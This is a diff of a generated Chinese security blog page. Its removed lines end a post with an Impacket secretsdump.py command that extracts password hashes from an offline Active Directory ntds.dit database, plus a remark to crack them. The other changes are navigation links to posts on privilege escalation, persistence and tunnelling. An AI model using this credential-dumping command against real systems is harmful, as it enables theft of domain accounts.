-<p>使用impack工具包下的secretsdump.py</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py -system system -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
-
-<p>然后解出来的hash去解密就好了。</p>
 
       
 
@@ -256,17 +371,6 @@
     <div class="article-info article-info-index">
       
       
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂念</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
       
 
       
@@ -317,7 +421,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/02/24/Liunx%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -331,18 +435,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2022/02/25/Raven2%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          内网穿透
+          Raven2靶机渗透
         
       </div>
     </a>
   
   
-    <a href="/2022/02/17/Liunx%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Liunx权限维持</div>
+    <a href="/2022/02/21/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">内网穿透</div>
       <i class="icon-circle-right"></i>
     </a>
   
